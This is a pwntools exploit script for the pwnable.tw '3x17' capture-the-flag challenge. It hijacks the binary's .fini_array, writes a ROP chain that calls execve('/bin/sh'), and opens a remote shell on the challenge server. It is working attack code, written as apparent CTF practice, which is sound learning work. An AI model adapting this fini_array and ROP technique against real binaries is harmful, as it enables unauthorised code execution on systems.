#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10105
LOCAL = False
elf = ELF("./3x17")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x401bed
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def send(addr, data):
    sa("addr:", str(addr))
    sa("data:", flat(data))

fini_array = 0x4B40F0
fini_array_call = 0x402960
main = 0x401B6D

pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
syscall = 0x4022b4
leave_ret = 0x401c4b

send(fini_array, [fini_array_call, main])
send(fini_array + 0x10, [pop_rax, 0x3b])
send(fini_array + 0x20, [pop_rsi, 0x0])
send(fini_array + 0x30, [pop_rdx, 0x0])
send(fini_array + 0x40, [pop_rdi, fini_array + 0x58])
send(fini_array + 0x50, [syscall, "/bin/sh\x00"])
send(fini_array, [leave_ret])


p.interactive()

